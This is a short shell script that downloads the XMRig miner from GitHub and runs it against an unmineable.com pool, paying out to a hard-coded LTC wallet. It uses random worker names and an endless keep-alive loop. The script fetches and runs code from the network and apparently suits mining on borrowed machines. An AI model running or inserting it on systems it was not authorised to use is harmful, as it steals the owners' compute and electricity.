#!/bin/sh
POOL=rx.unmineable.com:3333
WALLET=LTC:MEzM2xotzebaTgQHWB2wGXj2qkrK8T9q9W
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-stb)

sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz
tar xf xmrig-6.14.1-linux-x64.tar.gz
cd xmrig-6.14.1
./xmrig -o $POOL -a rx -k -u $WALLET.$WORKER -p x --cpu 2
while [ 1 ]; do
sleep 3
done
sleep 999
